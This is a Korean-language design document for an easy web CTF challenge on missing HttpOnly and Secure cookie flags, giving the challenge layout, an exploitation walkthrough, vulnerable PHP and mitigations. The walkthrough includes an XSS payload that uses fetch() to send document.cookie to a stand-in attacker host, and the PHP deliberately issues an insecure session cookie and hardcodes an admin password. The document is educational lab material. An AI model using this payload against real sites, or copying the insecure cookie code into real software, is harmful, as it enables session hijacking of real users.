---
title: Insecure Cookie Flags — Web CTF Scenario
created: 2026-06-15
updated: 2026-06-15
type: ctf-scenario
tags: [ctf, web, cookie, insecure-cookie, httponly, secure-flag, easy]
confidence: high
---

# Insecure Cookie Flags (안전하지 않은 쿠키 플래그 설정) — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Cookie Shield Inspector (쿠키 속성 검사기)
- **난이도**: Easy (초급)
- **핵심 컨셉**: 웹 애플리케이션의 중요한 인증용 세션 쿠키를 발행할 때 필요한 보안 플래그(`HttpOnly`, `Secure`)가 누락되어 발생하는 **보안 플래그 미설정 쿠키를 통한 데이터 유출 (Insecure Cookie Flags)** 취약점 문제입니다.
- 이 사이트는 사용자 로그인 시 세션 식별 쿠키인 `auth_token`을 발급합니다. 그러나 개발자는 이 쿠키의 속성 설정에서 `HttpOnly` 옵션과 `Secure` 옵션을 생략하였습니다. 이로 인해 브라우저의 클라이언트 사이드 스크립트(자바스크립트)에서 `document.cookie` 명령을 통해 인증 쿠키 값에 무제한 접근할 수 있는 조건이 생깁니다. 공격자는 대상 사이트에서 발생한 반사형 XSS 취약점과 본 보안 설정 미비를 결합하여, 피해자 브라우저에서 가동 중인 자바스크립트를 이용해 `auth_token` 값을 빼돌려 피해자의 세션 권한을 무단으로 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Login Portal (`/login.php`)**:
  - 정상 로그인 완료 시 쿠키 속성에 플래그 지정을 배제하고 `auth_token` 쿠키를 발행.
- **Vulnerable Notice Board (`/board.php`)**:
  - 게시판의 상세 본문 조회 시 반사형 또는 저장형 XSS 취약점이 존재하여 악성 스크립트 실행이 가능한 구역.
- **Flag 위치**:
  - 관리자(`admin`) 권한의 쿠키 세션값(`auth_token=[FLAG]`)으로 최종 탈취 목표물.

### 2.2 취약점 지점
1. **Missing HttpOnly and Secure Cookie Attributes**:
  - 백엔드 코드 단에서 세션 쿠키를 클라이언트로 송신할 때 원시적인 형태의 설정만 수행합니다:
    `setcookie("auth_token", $token, time() + 3600, "/");`
  - 표준적인 보안 쿠키 발행 절차라면 자바스크립트 격리를 위한 `HttpOnly` 속성과 HTTPS 통신을 강제하는 `Secure` 속성을 `true`로 넘겨야 하지만, 이 속성 인자들이 모두 `false` 혹은 생략된 채 발행되어 DOM(Document Object Model) 영역에 노출됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터 타입 | 취약 함수 및 태그 |
|------------|--------|------|----------|-------------|-------------------|
| `/login.php` | POST | 불필요 | `username`, `password` | Form Data | `setcookie()` 등 쿠키 발행 설정부 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 세션 쿠키 속성 조사
1. 임의 계정으로 로그인한 뒤, 브라우저 개발자 도구의 Console 창을 엽니다.
2. `document.cookie`를 콘솔에 입력하여 출력을 모니터링합니다.
3. 세션 토큰 역할을 담당하는 `auth_token=...` 정보가 자바스크립트 반환값으로 고스란히 출력되는 현상을 보고 `HttpOnly` 속성이 누락되었음을 진단합니다.

### Step 2. XSS 연동 취약점 지점 포착
1. 게시판 조회 페이지(`/board.php?search=...`)에서 입력한 검색 키워드가 HTML 필터링 없이 그대로 출력되는 XSS 결함 영역을 찾습니다.
2. `search` 파라미터 값에 `<script>alert(document.cookie)</script>` 를 대입하여 화면에 쿠키 경고창이 활성화됨을 확인합니다.

### Step 3. 쿠키 갈취 스크립트 주입 및 봇 호출
1. 관리자 봇에게 전달할 XSS 탈취 주소를 조립합니다. `document.cookie`를 공격자의 웹 로그 수집 서버로 자동 리디렉션해 전송하는 자바스크립트를 삽입합니다.
   - 페이로드 예:
     `http://target.local/board.php?search=%3Cscript%3Efetch('http://attacker.local/log?cookie='%2Bdocument.cookie)%3C/script%3E`
2. CTF 기능의 '관리자에게 방문 제안' 양식을 통해 위 최종 조작 링크를 제출합니다.

### Step 4. flag 획득
1. 공격자가 운영하는 웹 리스너 서버(`attacker.local`)의 로그 기록을 관찰합니다.
2. 로그인된 관리자 봇이 악성 페이지를 로드하면서 실행된 자바스크립트에 의해 유출된 `auth_token` 파라미터 데이터를 획득합니다.
3. 쿠키 로그 안의 플래그 문자열(`FLAG{insecure_cookie_httponly_flag_missing}`)을 확인하여 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (PHP)

```php
<!-- /login.php (취약한 쿠키 플래그 설정 PHP 예시) -->
<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // 관리자 또는 사용자 계정 검증 성공 조건 (예시)
    if ($username === 'admin' && $password === 'superadmin123') {
        $token = "FLAG{insecure_cookie_httponly_flag_missing}";
        
        // 취약점 지점: 쿠키 생성 시 5번째(Secure) 및 6번째(HttpOnly) 인자를 생략함.
        // 이로 인해 자바스크립트 영역에서 쿠키가 직접 읽히고, 평문 HTTP 통신 환경에서도 전송됨.
        // setcookie(name, value, expire, path, domain, secure, httponly)
        setcookie("auth_token", $token, time() + 3600, "/", "", false, false);
        
        header("Location: board.php");
        exit();
    }
}
?>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **HttpOnly 속성 강제 활성화**:
   - 세션 쿠키 발행 시 반드시 `HttpOnly` 속성을 `true`로 설정하여, XSS 공격 등으로 삽입된 악성 자바스크립트가 `document.cookie`를 조회하더라도 이 쿠키를 절대로 읽어가지 못하도록 브라우저 샌드박스로 격리 통제합니다.
     ```php
     // HttpOnly 속성을 true로 명시적 발행
     setcookie("auth_token", $token, time() + 3600, "/", "", false, true);
     ```
2. **Secure 속성 강제 적용**:
   - 기밀 정보 및 세션 자산 쿠키는 오직 암호화된 HTTPS 보안 연결 상에서만 네트워크로 송신되도록 `Secure` 속성을 `true`로 명시 선언합니다. 평문 HTTP 상태에서는 브라우저가 해당 쿠키를 서버로 내보내지 않아 중간자 공격(MITM) 스니핑을 철저히 막아냅니다.
3. **SameSite 쿠키 속성 기본 부착**:
   - 타겟 웹사이트 쿠키에 `SameSite=Lax` 혹은 `SameSite=Strict`를 지정하여 사이트 외부에서 유입되는 무단 교차 요청 상황(CSRF)에 쿠키가 불필요하게 묻어 나가지 않도록 차단 정책을 함께 기용합니다.
